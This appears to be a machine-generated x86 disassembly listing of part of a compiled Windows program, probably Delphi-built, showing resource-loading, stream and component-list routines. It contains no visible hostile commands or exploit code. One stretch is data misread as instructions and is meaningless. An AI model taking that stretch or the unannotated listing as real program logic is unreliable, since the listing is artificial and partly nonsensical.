jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_40683c
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_40682c
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
test ecx ecx
jne r-xdata
sub_415ed0
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028b8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_415df0
sub_415f20
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031f4
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_40441c
mov ecx eax
mov edx esi
mov eax edi
call sub_415fe8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_415f78
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_415fdb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
call sub_403998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415fe2
lea eax [ ebp - 0xc ]
call sub_403f5c
retn
sub_415fe8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_415f78
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_415d10
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_415f78
pop ecx
sub_416054
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406828
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_4160a4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026bc
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_4160ec
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4026dc
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_41611c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x4161
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x18004161 ] al
add [ eax ] al
add [ eax + 0x54004010 ] ah
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ eax + 0xe004162 ] dl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ eax + 0xe004162 ] ah
push esp
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
fsub [ ecx + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
popad
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax ] bl
popad
inc ecx
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_40404c
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4044bc
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403fb0
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403fb0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4161f0
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403fb0
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403fb0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_416248
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_40404c
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4044bc
mov al 0x1
inc ebx
sub_4162a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416317
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405598
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410d6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41631e
lea eax [ ebp - 0x4 ]
call sub_405598
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_41067c
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_405598
mov ecx eax
mov eax esi
pop edx
call sub_40cd04
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_405598
sub_416324
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4163ca
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4163d1
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_40404c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4198f8
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407b60
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_4163ec
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413974
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413974
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4137bc
sub_416424
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413974
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413974
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_413808
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4137bc
sub_41646c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_416605
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_413c84
mov edi eax
xor edx edx
push ebp
push sub_4165e6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4165ed
mov eax [ rw-data ]
call sub_413ce8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4165c7
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_416575
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_413918
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_413464
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41657c
mov eax [ ebp - 0x8 ]
call sub_403224
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4107a8
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_4163ec
pop ecx
mov edx esi
mov eax edi
call sub_413808
mov eax ebx
call sub_403224
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_416324
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_416424
pop ecx
inc esi
sub_41657c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403224
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_413918
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
sub_416614
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413c84
mov edi eax
xor eax eax
push ebp
push sub_4166af
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413ce8
retn
mov edx ebx
mov eax edi
call sub_413918
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_413808
mov eax esi
call sub_403224
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407b60
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4166c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413c84
mov edi eax
xor eax eax
push ebp
push sub_416737
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413ce8
retn
mov edx ebx
mov eax edi
call sub_413918
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_413808
mov eax esi
call sub_403224
sub_416768
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e8
call sub_403998
pop ecx
pop edx
pop ebx
retn
sub_4167ac
push ebx
push esi
push edi
call sub_403598
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4160ec
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_4167e8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4186c0
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_4187d0
call sub_41675c
sub_41680c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407b60
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403f5c
sub_416840
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407b60
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4186c0
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_416901
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_416c84
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_416c84
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416908
mov eax [ ebp - 0x8 ]
call sub_403224
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4187d0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41675c
sub_416930
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_416950
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_4041f8
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_403490
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41675c
sub_4169b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_413c84
mov esi eax
xor edx edx
push ebp
push sub_416a28
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416a2f
mov eax [ rw-data ]
call sub_413ce8
retn
mov edx ebx
mov eax esi
call sub_413918
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403224
mov edx ebx
mov eax esi
call sub_413808
sub_416a34
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_416b43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416b4a
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
xor edx edx
push ebp
push sub_416b26
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_416b78
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_416248
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413918
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_403ff4
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_416324
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413918
call sub_4169b8
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413918
mov edx eax
mov eax [ rw-data ]
call sub_413bfc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_413a0c
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_416b54
push ebx
mov ebx eax
mov eax ebx
call sub_416c48
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_4156b0
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_416b78
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403224
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_413918
call sub_403224
inc edi
dec esi
jne r-xdata
sub_416bb4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_40316c
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_412fac
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4031b0
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_413024
mov edi eax
mov edx [ esp + 0x4 ]
call sub_412f24
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_403188
test al al
jne r-xdata
sub_416c84
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_416cd0
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_416cd0
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
sub_416d20
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_416d6b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418520
mov eax [ ebp - 0x4 ]
call sub_40421c
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416d72
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
call sub_41675c
sub_416d78
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_416e18
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41691c
test al al
jne r-xdata
mov eax ebx
call sub_41691c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_414138
jmp r-xdata
mov eax ebx
call sub_416c60
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_417888
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416e1f
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_414118
mov esi eax
mov eax ebx
call sub_417880
jmp r-xdata
mov eax ebx
call sub_4177d0
mov eax ebx
call sub_41691c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4179ec
mov eax ebx
call sub_417888
sub_416e48
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404d24
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_4137bc
inc esi
dec ebx
jne r-xdata
sub_416e84
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_419a14
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404d24
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404ee0
add esp 0x4
mov edx ebx
mov eax edi
call sub_4199e8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404d24
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_4199e8
test [ eax + 0x24 ] 0x4
je r-xdata
sub_416efc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404d24
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_416f64
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
